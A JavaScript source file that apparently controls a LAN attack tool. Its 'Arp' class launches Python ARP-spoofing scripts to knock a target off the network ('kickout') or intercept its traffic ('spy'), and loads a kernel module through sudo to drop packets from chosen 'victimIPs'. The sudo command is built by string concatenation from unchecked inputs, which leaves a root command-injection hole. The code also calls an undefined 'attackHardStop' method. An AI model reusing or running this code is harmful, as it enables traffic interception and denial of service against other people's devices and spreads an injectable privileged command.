const { spawn } = require("child_process");
const sudo = require("sudo-prompt");

class Arp {
  privIP;
  gateIP;
  processList;

  constructor(privateIP, gatewayIP) {
    this.privIP = privateIP;
    this.gateIP = gatewayIP;
    this.processList = [];
  }

  kickoutStart(targetIP, gatewayMAC) {
    // setup extra requred permissions for linux, they will be unsed at attackHardStop
    const cmdPath = "./src/services/kickout.py";
    const proc = spawn(
      "python3",
      [cmdPath, this.gateIP, targetIP, gatewayMAC, "_targetMAC", "0"],
      { detached: true }
    );
    proc.on("error", (err) => {
      console.log("INFO:" + err);
    });
    console.log("INFP: spawn process " + proc.pid);
    this.processList.push(proc.pid);
  }

  kickoutStop(targetIP, gatewayMAC, targetMAC) {
    this.attackHardStop();
    const cmdPath = "./src/services/kickout.py";
    const proc = spawn(
      "python3",
      [cmdPath, this.gateIP, targetIP, gatewayMAC, targetMAC, "1"],
      { detached: true }
    );
    proc.on("error", (err) => {
      console.log(err);
    });
    console.log("Process " + proc.pid + "spawned");
    this.processList.push(proc.pid);
  }

  /**
   * Some routers will block ARP packet when the sender IP address is the same as the router.
   * This method is a walk around of this issue, when this method is called, user can only see
   * the packets send to the target, but not packets send by the target.
   * @param {string} targetIP
   * @param {string} gatewayMAC
   */
  spyLimitedStart(targetIP, gatewayMAC) {
    this.kickoutStart(targetIP, gatewayMAC);
  }

  spyStart(targetIP, targetMAC, gatewayMAC) {
    const cmdPath = "./src/services/spy.py";
    const proc = spawn(
      "python3",
      [cmdPath, this.gateIP, targetIP, gatewayMAC, targetMAC, "0"],
      { detached: true }
    );
    proc.on("error", (err) => {
      console.log(err);
    });
    console.log("Process " + proc.pid + "spawned");
    this.processList.push(proc.pid);
  }

  speedLimitStart(percent, victimIPs) {
    if (process.platform === "linux") {
      const modulePath =
        process.cwd() + "/src/services/kernelModule/netfilter_drop_packet.ko";
      const cmd =
        "insmod " +
        modulePath +
        " percent=" +
        percent +
        " victimIPs=" +
        victimIPs;
      const options = {
        name: "DoNotEnter",
      };
      console.log("INFO: insert module command is: " + cmd);
      // insert the kernel module
      sudo.exec(cmd, options, (error, _stdout, _stderr) => {
        if (error) {
          console.log(error);
        }
      });
    }
  }

  speedLimitStop() {
    const options = {
      name: "DoNotEnter",
    };
    if (process.platform === "linux") {
      sudo.exec(
        "rmmod netfilter_drop_packet",
        options,
        (error, _stdout, _stderr) => {
          if (error) {
            console.log(error);
          }
        }
      );
    }
  }

  killAttackProcesses() {
    for (let i = 0; i < this.processList.length; i++) {
      console.log(
        "INFO: stopping attack by killing process " + this.processList[i]
      );
      process.kill(this.processList[i]);
    }
    this.processList = [];
  }
}

module.exports = Arp;
